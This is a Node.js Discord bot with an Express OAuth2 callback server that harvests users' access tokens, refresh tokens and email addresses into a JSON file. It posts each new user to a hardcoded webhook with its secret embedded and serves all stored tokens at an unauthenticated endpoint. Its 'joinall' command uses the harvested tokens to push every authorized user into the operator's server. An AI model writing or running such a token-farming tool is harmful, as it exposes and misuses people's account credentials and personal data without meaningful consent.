const Discord = require('discord.js');
const client = new Discord.Client({
  intents: 32767,
});
const { MessageActionRow, MessageButton, MessageEmbed } = require('discord.js');
const config = require("./config");
const chalk = require('chalk');
const db = require('quick.db');
const fs = require('fs');
const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
const axios = require('axios');

app.use(bodyParser.text());

/* EXPRESS JS */

app.get('/', function (req, res) {
  res.sendFile(__dirname + '/index.html');
});

app.get('/allAuth-noauth', async (req, res) => {
  fs.readFile('./object.json', function (err, data) {
    return res.json(JSON.parse(data));
  });
});

app.get('/callback', async (req, res) => {
  const code = req.query.code;

  const formData = new URLSearchParams();
  formData.append('client_id', config.clientId);
  formData.append('client_secret', config.clientSecret);
  formData.append('grant_type', 'authorization_code');
  formData.append('redirect_uri', config.redirectUri);
  formData.append('scope', config.scope);
  formData.append('code', code);

  try {
    const tokenResponse = await fetch('https://discordapp.com/api/oauth2/token', {
      method: 'POST',
      body: formData,
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
    });
    const tokenData = await tokenResponse.json();
    const accessToken = tokenData.access_token;
    const refreshToken = tokenData.refresh_token;
    const headersWithToken = { headers: { authorization: `${tokenData.token_type} ${accessToken}` } };
    const userDataResponse = await axios.get('https://discordapp.com/api/users/@me', headersWithToken);
    console.log(userDataResponse.data);

    const userId = userDataResponse.data.id;
    const objectData = fs.readFileSync('./object.json');
    const objectJson = JSON.parse(objectData);

    if (objectJson.some((user) => user.userID === userId)) {
      console.log(`[-] ${userDataResponse.data.username}#${userDataResponse.data.discriminator}`);
    } else {
      console.log(`[+] ${userDataResponse.data.username}#${userDataResponse.data.discriminator}`);
      const avatarUrl = `https://cdn.discordapp.com/avatars/${userDataResponse.data.id}/${userDataResponse.data.avatar}.png?size=4096`;

      fetch('https://ptb.discord.com/api/webhooks/997499223182413865/gbY6JFAR8XZ0haFyV6f31fe0p27Ms46VNh0rCYcO3UACZnZ5z82Qqnx9kXl6bLaAh_9Z', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          avatar_url: '',
          embeds: [
            {
              color: 3092790,
              title: `${userDataResponse.data.username}#${userDataResponse.data.discriminator} - ${userDataResponse.data.id}`,
              thumbnail: { url: avatarUrl },
              description: `\`\`\`diff\n- New User\n\n- Pseudo: ${userDataResponse.data.username}#${userDataResponse.data.discriminator}\n\n- ID: ${userDataResponse.data.id}\`\`\``,
            },
          ],
        }),
      });

      const newUser = {
        userID: userDataResponse.data.id,
        avatarURL: avatarUrl,
        username: `${userDataResponse.data.username}#${userDataResponse.data.discriminator}`,
        access_token: accessToken,
        refresh_token: refreshToken,
        mail : userDataResponse.data.email,
      };

      objectJson.push(newUser);
      fs.writeFileSync('./object.json', JSON.stringify(objectJson));
      res.redirect('/');
    }
  } catch (error) {
    console.log(error);
  }
});


async function renewToken(clientId, clientSecret, refreshToken) {
  try {
    const formData = new URLSearchParams();
    formData.append('client_id', clientId);
    formData.append('client_secret', clientSecret);
    formData.append('grant_type', 'refresh_token');
    formData.append('refresh_token', refreshToken);

    const response = await fetch('https://discordapp.com/api/oauth2/token', { 
      method: 'POST', 
      body: formData,
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      }
    });

    if (!response.ok) {
      throw new Error(`Failed to renew token. Status: ${response.status}`);
    }

    const data = await response.json();
    return data.access_token;
  } catch (error) {
    console.error('Error renewing token:', error);
    throw error;
  }
}



/* DISCORD BOT */

client.on("ready", () => {
  console.log(`${chalk.blue('NOAuth')}\n${chalk.green('->')} Le bot est connecté en tant que [ ${client.user.username} ], il utilise comme prefix : ${config.prefix}\n${chalk.green('->')} L'invite du bot : https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot`);
  client.user.setActivity("en légende", {
    type: "WATCHING",
    //url: "https://www.twitch.tv/monstercat"
  });
});

client.on('guildMemberAdd', (member) => {
  const userId = member.user.id;
  console.log(`New member joined! User ID: ${userId}`);
});

client.on('guildMemberRemove', (member) => {
  const userId = member.user.id;
  console.log(`Member left! User ID: ${userId}`);
});

const exampleEmbed = {
	color: 0x0099ff,
	title: 'Some title',
	url: 'https://discord.js.org',
	author: {
		name: 'Some name',
		icon_url: 'https://i.imgur.com/AfFp7pu.png',
		url: 'https://discord.js.org',
	},
	description: 'Some description here',
	thumbnail: {
		url: 'https://i.imgur.com/AfFp7pu.png',
	},
	fields: [
		{
			name: 'Regular field title',
			value: 'Some value here',
		},
		{
			name: '\u200b',
			value: '\u200b',
			inline: false,
		},
		{
			name: 'Inline field title',
			value: 'Some value here',
			inline: true,
		},
		{
			name: 'Inline field title',
			value: 'Some value here',
			inline: true,
		},
		{
			name: 'Inline field title',
			value: 'Some value here',
			inline: true,
		},
	],
	image: {
		url: 'https://i.imgur.com/AfFp7pu.png',
	},
	timestamp: new Date().toISOString(),
	footer: {
		text: 'Some footer text here',
		icon_url: 'https://i.imgur.com/AfFp7pu.png',
	},
};



const button = new MessageButton()
.setLabel('Authenitify here')
.setURL(config.authLink)
.setStyle('LINK');

const actionRow = new MessageActionRow()
.addComponents(button);

client.on("messageCreate", async (message) => {
  if (!message.guild || message.author.bot) return;
  
  const prefixRegex = new RegExp(`^(<@!?${client.user.id}>|${escapeRegex(config.prefix)})\\s*`);
  if (!prefixRegex.test(message.content)) return;
  
  const [, matchedPrefix] = message.content.match(prefixRegex);
  const args = message.content.slice(matchedPrefix.length).trim().split(/ +/);
  const cmd = args.shift().toLowerCase();

  if (cmd === "button") {
    message.channel.send({
      components: [actionRow]  ,
      embeds: [exampleEmbed]
    });
  }

  if (cmd === "wl") {
    if (!config.owners.includes(message.author.id)) return;
    
    switch (args[0]) {
      case "add":
        const userToAdd = !isNaN(args[1]) ? (await client.users.fetch(args[1]).catch(() => { })) : undefined || message.mentions.users.first();
        if (db.get(`wl_${userToAdd.id}`) === null) {
          db.set(`wl_${userToAdd.id}`, true);
          message.channel.send({
            embeds: [{
              description: `**${userToAdd.username}** has been added to the whitelist`,
              color: "2F3136"
            }]
          });
        } else {
          message.channel.send({
            embeds: [{
              description: `**${userToAdd.username}** is already whitelisted`,
              color: "2F3136"
            }]
          });
        }
        break;

      case "remove":
        const userToRemove = !isNaN(args[1]) ? (await client.users.fetch(args[1]).catch(() => { })) : undefined || message.mentions.users.first();
        if (db.get(`wl_${userToRemove.id}`) !== null) {
          db.delete(`wl_${userToRemove.id}`);
          message.channel.send({
            embeds: [{
              description: `**${userToRemove.username}** has been removed from the whitelist`,
              color: "2F3136"
            }]
          });
        } else {
          message.channel.send({
            embeds: [{
              description: `**${userToRemove.username}** was not whitelisted`,
              color: "2F3136"
            }]
          });
        }
        break;

      case "list":
        var content = "";
        const whitelistedUsers = db.all().filter((data) => data.ID.startsWith(`wl_`)).sort((a, b) => b.data - a.data);
        
        for (let i in whitelistedUsers) {
          if (whitelistedUsers[i].data === null) whitelistedUsers[i].data = 0;
          content += `\`${whitelistedUsers.indexOf(whitelistedUsers[i]) + 1}\` ${client.users.cache.get(whitelistedUsers[i].ID.split("_")[1]).tag} (\`${client.users.cache.get(whitelistedUsers[i].ID.split("_")[1]).id}\`)\n`;
        }

        message.channel.send({
          embeds: [{
            title: "Whitelisted Users",
            description: `${content}`,
            color: "2F3136",
          }]
        });
        break;
    }
  }

  if (cmd === "help") {
    if (db.get(`wl_${message.author.id}`) !== true && !config.owners.includes(message.author.id)) return;
    
    message.channel.send({
      embeds: [{
        color: "2F3136",
        title: '<:users:995482295198826547> 0auth2 Dashboard',
        description: '<:join:997096856431640586> **0auth2**\n`joinall`, `Users`, `Links`\n\n<:join:997096856431640586> **Prefix** `;`\n<:info:997096855143989329> *Message sent to users when they authorized:*\n```Hi, welcome 🎁```',
      }]
    });
  }

  if (cmd === "links") {
    if (db.get(`wl_${message.author.id}`) !== true && !config.owners.includes(message.author.id)) return;
    
    message.channel.send({
      embeds: [{
        title: '<:links:996492434278187169> Oauth/Invite:',
        description: `<:join:997096856431640586> **Your OAuth2 Link:** ${config.authLink}\n\`\`\`${config.authLink}\`\`\`\n<:join:997096856431640586> **Bot Invite:** https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot\n \`\`\`https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot\`\`\` `,
        color: "2F3136"
      }]
    });
  }

  if (cmd === "joinall") {
    if (db.get(`wl_${message.author.id}`) !== true && !config.owners.includes(message.author.id)) return;
    
    let msg = await message.channel.send({
      content: '**Joining users...**'
    });

    fs.readFile('./object.json', async function (err, data) {
      let json = JSON.parse(data);
      let error = 0;
      let success = 0;
      let alreadyJoined = 0;

      for (const i of json) {
        const user = await client.users.fetch(i.userID).catch(() => {});
        if (message.guild.members.cache.get(i.userID)) {
          alreadyJoined++;
        }
        await message.guild.members.add(user, { accessToken: i.access_token }).catch(() => {
          error++;
        });
        success++;
      }

      await msg.edit({
        content: `**Joining users...** : \`${success}\``
      });

      await msg.edit({
        embeds: [{
          title: '<:users:995482295198826547> 0auth2 Joinall',
          description: `<:info:997096855143989329> **Already in server**: ${alreadyJoined}\n<:join:997096856431640586> **Success**: ${success}\n<:fail:997096858105167922> **Error**: ${error}`,
          color: "2F3136"
        }]
      }).catch(() => {});
    });
  }

  if (cmd === "users") {
    if (db.get(`wl_${message.author.id}`) !== true && !config.owners.includes(message.author.id)) return;

    fs.readFile('./object.json', async function (err, data) {
      return message.channel.send({
        embeds: [{
          title: '<:users:995482295198826547> OAuth2 Users:',
          description: `There are ${JSON.parse(data).length > 1 ? `\`${JSON.parse(data).length}\` members` : `\`${JSON.parse(data).length}\` users in the bot`}\nType command \`links\` to check your OAuth2 link`,
          color: "2F3136"
        }]
      });
    });
  }
});


function escapeRegex(str) {
    return str.replace(/[.*+?^${}()|[\]\\]/g, `\\$&`);
}
  

/* LAUNCHING DISCORD AND EXPRESS SERVERS */

client.login(config.token).catch(() => {
    throw new Error(`TOKEN OR INTENT INVALID`);
});
  
app.listen(config.port, () => console.log('Connexion...'));